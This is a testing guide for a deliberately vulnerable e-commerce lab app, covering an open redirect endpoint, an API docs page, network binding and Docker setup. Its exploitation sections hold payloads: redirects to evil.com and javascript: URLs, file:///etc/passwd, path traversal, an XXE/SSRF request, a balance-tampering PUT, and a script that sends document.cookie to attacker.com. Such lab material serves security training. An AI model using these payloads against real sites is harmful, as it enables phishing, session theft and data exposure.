# 🧪 Version 1.6 - New Features Testing Guide

## New Features

1. **Open Redirect Vulnerability**
2. **API Documentation Page**
3. **0.0.0.0 Host Support**
4. **Docker Support**

---

## 1️⃣ Open Redirect Vulnerability

### What is it?
The `/redirect` endpoint redirects users to any URL without validation, allowing attackers to redirect users to malicious sites.

### Testing via Browser

**1. Test legitimate redirect:**
```
http://localhost:3001/redirect?url=https://github.com/nr-yolo
```
Should redirect to GitHub.

**2. Test malicious redirect:**
```
http://localhost:3001/redirect?url=http://evil.com
```
Would redirect to evil.com (if it existed).

**3. Test JavaScript protocol:**
```
http://localhost:3001/redirect?url=javascript:alert('XSS')
```
May execute JavaScript (depends on browser).

### Testing via curl

```bash
# Follow redirect
curl -L "http://localhost:3001/redirect?url=https://github.com/nr-yolo"

# See redirect without following
curl -I "http://localhost:3001/redirect?url=https://github.com/nr-yolo"
```

### Exploitation Scenarios

**Phishing Attack:**
```
https://trusted-shop.com/redirect?url=http://fake-login-page.com
```
Users see trusted-shop.com in the URL, but get redirected to attacker's site.

**Session Theft:**
```html
<!-- Attacker's page -->
<script>
// Steal session after redirect
fetch('http://attacker.com/steal?session=' + document.cookie);
</script>
```

**SEO Poisoning:**
```
https://legit-site.com/redirect?url=http://spam-site.com
```
Search engines may follow and index the redirect.

### Finding the Vulnerability

**1. Homepage link:**
- Visit http://localhost:3000
- See "⭐ Star us on GitHub" button
- Right-click → Inspect
- See URL: `http://localhost:3001/redirect?url=https://github.com/nr-yolo`

**2. API Documentation:**
- Go to API Docs page
- Scroll to "Special Endpoints" section
- See /redirect documentation

### Test Different Payloads

```bash
# File protocol (may work)
http://localhost:3001/redirect?url=file:///etc/passwd

# Data URL
http://localhost:3001/redirect?url=data:text/html,<script>alert('XSS')</script>

# Protocol-relative URL
http://localhost:3001/redirect?url=//evil.com

# URL encoding bypass
http://localhost:3001/redirect?url=http%3A%2F%2Fevil.com
```

---

## 2️⃣ API Documentation Page

### Accessing the Page

**In Browser:**
1. Open http://localhost:3000
2. Click "📚 API Docs" button in header
3. Browse complete API reference

**Features:**
- All endpoints documented
- HTTP methods (GET, POST, PUT, PATCH, DELETE)
- Request parameters
- Response examples
- Vulnerability tags
- Code examples

### Sections Included

1. **Authentication** - Login, register, OTP
2. **Users** - Profile, wallet, IDOR exploits
3. **Products** - List, search, update, XXE
4. **Cart & Orders** - Shopping flow
5. **File Operations** - Path traversal, XSS
6. **Admin** - Command injection
7. **Special Endpoints** - Open redirect, TRACE

### Using the Documentation

**Copy curl commands:**
All endpoints include example curl commands you can copy and test.

**Test from documentation:**
```bash
# Example from docs
curl -X PUT http://localhost:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"credit":999999}'
```

**Learn attack vectors:**
Each endpoint shows which vulnerabilities it contains.

---

## 3️⃣ Running on 0.0.0.0

### Why Use 0.0.0.0?

- Access from other machines on your network
- Test from mobile devices
- Docker deployments
- VirtualBox/VMware access

### Start with 0.0.0.0

**Backend:**
```bash
cd backend
HOST=0.0.0.0 npm start

# Or on Windows:
set HOST=0.0.0.0
npm start
```

**Frontend:**
```bash
cd frontend
HOST=0.0.0.0 npm start
```

### Access from Other Devices

**Find your IP address:**

```bash
# Linux/Mac
ifconfig | grep "inet "
ip addr show

# Windows
ipconfig
```

Example: Your IP is 192.168.1.100

**Access from phone/tablet:**
```
http://192.168.1.100:3000
```

**Access from another computer:**
```
http://192.168.1.100:3000
```

### Testing from Different Devices

**1. From mobile phone:**
- Connect to same WiFi network
- Open browser
- Go to http://YOUR_IP:3000
- Test all vulnerabilities

**2. From another laptop:**
- Same network
- Test with Burp Suite proxy
- Intercept requests to YOUR_IP:3001

**3. From virtual machine:**
- Bridge network mode
- Access host IP:3000

### Security Warning

⚠️ **ONLY use 0.0.0.0 on isolated/trusted networks!**

This application is intentionally vulnerable. Running on 0.0.0.0 makes it accessible to anyone on your network.

**Safe environments:**
- Home network (trusted)
- Isolated lab network
- Virtual network
- Docker internal network

**Unsafe environments:**
- Public WiFi
- Corporate networks
- Cloud instances
- Any untrusted network

---

## 4️⃣ Docker Support

### Quick Start

**1. Start with Docker Compose:**
```bash
cd vulnerable-ecommerce
docker-compose up
```

**2. Access the application:**
- Frontend: http://localhost:3000
- Backend: http://localhost:3001

**3. Stop:**
```bash
docker-compose down
```

### Docker Commands

**Build images:**
```bash
docker-compose build
```

**Start in background:**
```bash
docker-compose up -d
```

**View logs:**
```bash
docker-compose logs -f
```

**Restart services:**
```bash
docker-compose restart
```

**Reset database:**
```bash
docker-compose down -v
docker-compose up
```

### Access Container Shell

**Backend container:**
```bash
docker-compose exec backend sh

# Inside container:
ls
cat server.js
node --version
```

**Frontend container:**
```bash
docker-compose exec frontend sh

# Inside container:
ls src/
npm list
```

### Testing in Docker

**1. Test from host machine:**
```bash
# Same as normal
curl http://localhost:3001/api/products
```

**2. Test from inside container:**
```bash
docker-compose exec backend sh
wget http://localhost:3001/api/products
```

**3. Test network connectivity:**
```bash
# Backend → Frontend
docker-compose exec backend wget http://frontend:3000

# Frontend → Backend
docker-compose exec frontend wget http://backend:3001/api/products
```

### Docker Volumes

**Database persistence:**
```bash
# Database stored in volume
docker volume ls | grep vulnshop

# Backup database
docker cp vulnshop-backend:/app/../database/ecommerce.db ./backup.db

# Restore database
docker cp ./backup.db vulnshop-backend:/app/../database/ecommerce.db
docker-compose restart backend
```

### Troubleshooting Docker

**Port conflicts:**
```bash
# Change ports in docker-compose.yml
ports:
  - "8000:3000"  # Use port 8000 instead
```

**Container won't start:**
```bash
docker-compose logs backend
docker-compose logs frontend
```

**Reset everything:**
```bash
docker-compose down -v
docker-compose build --no-cache
docker-compose up
```

---

## 🎯 Complete Testing Scenario

### Scenario: Full Exploitation Chain

**1. Deploy with Docker:**
```bash
docker-compose up -d
```

**2. Access from mobile device:**
```
http://YOUR_IP:3000
```

**3. Test open redirect:**
```
http://YOUR_IP:3001/redirect?url=https://github.com/nr-yolo
```

**4. Read API documentation:**
- Click "API Docs"
- Find interesting endpoints

**5. Exploit vulnerabilities:**

**Path Traversal:**
```bash
curl "http://YOUR_IP:3001/api/view-photo?photo=../../../server.js"
```

**Open Redirect + Phishing:**
```bash
# Create fake login page at http://attacker.com/fake-login
# Send victim: http://YOUR_IP:3001/redirect?url=http://attacker.com/fake-login
```

**XXE + SSRF:**
```bash
curl -X POST http://YOUR_IP:3001/api/products/check-stock \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:3001/metrics">]>
<stockCheck><productId>&xxe;</productId></stockCheck>'
```

**PUT Method Exploit:**
```bash
# Login
curl -X POST http://YOUR_IP:3001/api/auth/login \
  -d '{"username":"admin","password":"admin"}' \
  -c cookies.txt

# Give yourself unlimited money
curl -X PUT http://YOUR_IP:3001/api/users/2 \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"credit":999999}'
```

---

## ✅ Verification Checklist

### Open Redirect
- [ ] GitHub link appears on homepage
- [ ] Clicking redirects to GitHub
- [ ] Changing ?url= parameter works
- [ ] Can redirect to arbitrary URLs
- [ ] Hint message visible

### API Documentation
- [ ] API Docs button in header
- [ ] Page loads with all endpoints
- [ ] Methods color-coded (GET=green, POST=blue, etc.)
- [ ] Vulnerability tags visible
- [ ] Code examples copyable

### 0.0.0.0 Support
- [ ] Backend starts with HOST=0.0.0.0
- [ ] Frontend starts with HOST=0.0.0.0
- [ ] Accessible from other devices
- [ ] Mobile device can access
- [ ] Another computer can access

### Docker Support
- [ ] docker-compose up works
- [ ] Frontend accessible at :3000
- [ ] Backend accessible at :3001
- [ ] Database persists
- [ ] Hot reload works
- [ ] Logs visible
- [ ] Can reset with -v flag

---

## 📚 Additional Documentation

See also:
- **DOCKER_SETUP.md** - Complete Docker guide
- **README.md** - Main documentation
- **VULNERABILITY_TESTING.md** - All 50+ vulnerabilities
- **DEBUGGING_GUIDE.md** - Troubleshooting help

---

**Happy Hacking! 🎯**

Remember: Always test responsibly in isolated environments!
